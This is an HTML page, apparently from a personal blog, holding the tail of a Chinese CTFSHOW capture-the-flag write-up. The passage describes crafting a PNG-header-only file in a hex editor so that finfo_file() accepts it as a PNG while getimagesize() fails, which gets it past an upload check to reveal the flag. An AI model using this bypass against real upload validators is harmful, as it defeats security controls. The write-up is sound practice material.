+<p>在检查文件类型时，finfo_file()函数检测上传图片的类型是否是image&#x2F;png在检查文件长宽时，getimagesize() 函数用于获取图像大小及相关信息，成功将返回个数组<br>也就是说要finfo_file()识别为png,而getimagesize()不识别为png我们打开010editor构造一个16进制文件：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669088221261-113f5c8b-22e5-481d-840b-de4a35bed550.png#averageHue=%23403e38&clientId=uad47d4c1-c255-4&from=paste&height=186&id=ua47f2dac&name=image.png&originHeight=232&originWidth=633&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70111&status=done&style=none&taskId=u99fa6eba-bce0-42d1-b4d8-582f336c3c4&title=&width=506.4" alt="image.png"><br>将普通png图片的第一行（文件头）放入新建的文件中：<br><strong>我们第二行不放任何信息，来让getimagesize()出错返回false，从而逃过了getimagesize函数！！</strong><br>之后将文件保存为png格式，上传：<br>答案直接就蹦出来了！<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669088245538-1602dd55-d107-4668-89c0-d663854b7632.png#averageHue=%23baada0&clientId=uad47d4c1-c255-4&from=paste&height=159&id=ua01e0793&name=image.png&originHeight=199&originWidth=475&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17688&status=done&style=none&taskId=u465a0476-eed0-40ee-be92-a63c5a3ce25&title=&width=380" alt="image.png"></p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/刷题记录/" class="tag">#刷题记录</a><a href="/tags/CTFSHOW/" class="tag">#CTFSHOW</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/02/CTFSHOW-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">CTFSHOW-Java反序列化</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/02/%E4%B8%8D%E8%A6%81%E6%8D%89%E5%BC%84%E6%88%91%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6%EF%BC%9AS/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">不要捉弄我新人同学: S</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
